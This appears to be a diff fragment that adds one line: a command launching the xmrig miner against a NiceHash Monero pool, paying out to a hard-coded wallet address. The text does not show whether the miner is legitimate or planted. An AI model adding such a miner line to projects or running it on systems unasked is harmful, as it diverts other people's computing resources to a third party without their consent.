@@ -1,0 +1,1 @@
+./xmrig -o stratum+tcp://randomxmonero.eu-west.nicehash.com:3380 -u 3KBhqJunjcQJY21ergiQSvY7pZsa8nDjmS -p x -k --nicehash -a rx/0
